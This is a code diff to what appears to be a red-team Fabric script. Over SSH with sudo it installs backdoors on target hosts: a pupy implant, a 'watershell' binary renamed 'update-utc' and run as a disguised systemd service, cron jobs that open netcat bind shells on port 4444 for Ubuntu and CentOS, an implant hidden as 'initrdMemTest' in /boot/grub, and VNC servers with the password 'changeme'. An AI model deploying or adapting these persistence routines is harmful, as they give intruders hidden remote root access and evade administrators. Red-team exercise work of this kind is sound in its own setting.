@@ -35,7 +35,7 @@ def pfsense_user(connect):
 
 
 def pupy(connect):
-    #REQUIRES A CLIENT TO BE INSTALLED AND THE MALWARE
+    #REQUIRES A CLIENT TO BE INSTALLED AND THE MALWAR
     connect.put('UploadFiles/pupy')
     connect.sudo('mv pupy /bin/')
     connect.sudo('chmod 777 /bin/pupy')
@@ -60,12 +60,17 @@ def merlin(connect):
 def watershell(connect):
     connect.put('UploadFiles/watershell/watershell.c')
     connect.put('UploadFiles/watershell/watershell.h')
-    connect.sudo('gcc watershell.c -o watershell')
-    connect.sudo('mv watershell /bin/')
-    connect.sudo('nohup watershell &')
-    connect.run("sh -c 'echo \"@reboot /bin/watershell\" > water.txt'")
-    connect.sudo("crontab -u root water.txt")
-    connect.run("rm water.txt watershell.c watershell.h")
+    connect.sudo('gcc watershell.c -o update-utc')
+    connect.sudo('mv update-utc /usr/sbin/')
+    connect.put('UploadFiles/update-utc.service')
+    connect.sudo('mv update-utc.service /lib/systemd/system/')
+    connect.sudo('chmod 664 /lib/systemd/system/update-utc.service')
+    connect.sudo('systemctl daemon-reload')
+    connect.sudo('systemctl enable update-utc.service')
+    connect.sudo('systemctl start update-utc.service')
+    connect.run("rm watershell.c watershell.h")
+
+    # connect.sudo('screen -d -m /boot/grub/./initrdMemTest')
 # nc <IP> <port> -u
 # run: mkdir pwned
 # Note: You will not see any output
@@ -79,9 +84,13 @@ def nomnom_ubuntu(connect):
     connect.run('rm openssh-server_7.2p2-4ubuntu2.7_amd64.deb')
 
 
-def vince_netcat(connect):
+def vince_netcat_ubuntu(connect):
     connect.sudo("apt install netcat-traditional -y")
     connect.sudo("crontab -l | echo '*/5 * * * * nc.traditional -lvp 4444 -e /bin/sh' | crontab -")
+
+def vince_netcat_centos(connect):
+    # connect.sudo("yum install netcat -y")
+    connect.sudo("crontab -l | echo '*/5 * * * * netcat -lvp 4444 -e /bin/sh' | crontab -")
 
 
 def ohad_pyiris_ubuntu(connect):
@@ -105,7 +114,25 @@ def ohad_pyiris(connect):
     connect.sudo('systemctl daemon-reload')
     connect.sudo('systemctl enable init-memtest.service')
     connect.sudo('systemctl start init-memtest.service')
-    connect.sudo('screen -d -m /boot/grub/./initrdMemTest')
+    # connect.sudo('screen -d -m /boot/grub/./initrdMemTest')
+
+
+def ohad_vnc(connect):
+    connect.sudo('sudo apt-get install vnc4server nautilus metacity -y')
+    connect.sudo("sh -c 'printf \"changeme\nchangeme\n\" | vncserver '" )
+    connect.sudo('mv xstartup ~/.vnc/xstartup')
+    connect.sudo('chmod +x ~/.vnc/xstartup')
+    connect.sudo("vncserver")
+
+def ohad_vnc_lubuntu(connect):
+    connect.put('UploadFiles/xstartup-Lubuntu')
+    connect.sudo('mv xstartup-Lubuntu xstartup')
+    ohad_vnc(connect)
+
+def ohad_vnc_xubuntu(connect):
+    connect.put('UploadFiles/xstartup-Xubuntu')
+    connect.sudo('mv xstartup-Xubuntu xstartup')
+    ohad_vnc(connect)
 
 
 # Up to implementation: merlin and empyre
